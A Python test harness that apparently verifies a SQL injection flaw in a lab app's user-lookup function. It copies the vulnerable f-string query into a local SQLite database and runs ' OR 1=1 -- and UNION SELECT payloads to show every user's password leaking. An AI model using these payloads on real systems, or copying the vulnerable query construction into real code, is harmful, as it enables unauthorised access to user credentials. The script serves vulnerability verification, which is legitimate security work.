#!/usr/bin/env python3
"""Harness: Verify SQL injection in run_user_lookup (board/engine.py:71).

Replicates the vulnerable f-string SQL construction and executes it against
an in-memory SQLite database with the same schema and seed data as the app.
"""
import sqlite3


def run_user_lookup(name: str, conn) -> list[dict]:
    """Exact copy of the vulnerable function from board/engine.py:69-74."""
    sql = f"SELECT id, name, role, email, password FROM users WHERE name = '{name}'"
    rows = conn.execute(sql).fetchall()
    return [dict(r) for r in rows]


def main() -> int:
    conn = sqlite3.connect(":memory:")
    conn.row_factory = sqlite3.Row
    conn.executescript("""
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY,
            name TEXT NOT NULL,
            password TEXT NOT NULL,
            role TEXT NOT NULL,
            email TEXT NOT NULL
        );
    """)
    conn.executemany(
        "INSERT INTO users(name, password, role, email) VALUES (?, ?, ?, ?)",
        [
            ("alice", "alice123", "user", "alice@memoboard.lab"),
            ("bob", "bob123", "user", "bob@memoboard.lab"),
            ("admin", "admin123", "admin", "admin@memoboard.lab"),
        ],
    )
    conn.commit()

    # Test 1: Normal query
    print("=== Test 1: Normal query (name=alice) ===")
    result = run_user_lookup("alice", conn)
    assert len(result) == 1 and result[0]["name"] == "alice"
    print(f"PASS: returns {result[0]['name']}\n")

    # Test 2: SQL injection ' OR 1=1 --
    print("=== Test 2: SQL injection payload: ' OR 1=1 -- ===")
    result = run_user_lookup("' OR 1=1 --", conn)
    print(f"Records returned: {len(result)}")
    for r in result:
        print(f"  name={r['name']}, password={r['password']}, role={r['role']}")
    assert len(result) == 3
    admin = [r for r in result if r["role"] == "admin"]
    assert len(admin) == 1 and admin[0]["password"] == "admin123"
    print("PASS: all users including admin password leaked\n")

    # Test 3: UNION injection
    print("=== Test 3: UNION-based injection ===")
    result = run_user_lookup("' UNION SELECT id, name, role, email, password FROM users --", conn)
    assert len(result) >= 3
    print(f"PASS: {len(result)} records via UNION\n")

    # Test 4: Constructed SQL string
    payload = "' OR 1=1 --"
    sql = f"SELECT id, name, role, email, password FROM users WHERE name = '{payload}'"
    print(f"=== Test 4: Constructed SQL ===\n{sql}")
    print("PASS: valid injectable SQL\n")

    print("=== ALL TESTS PASSED ===")
    conn.close()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
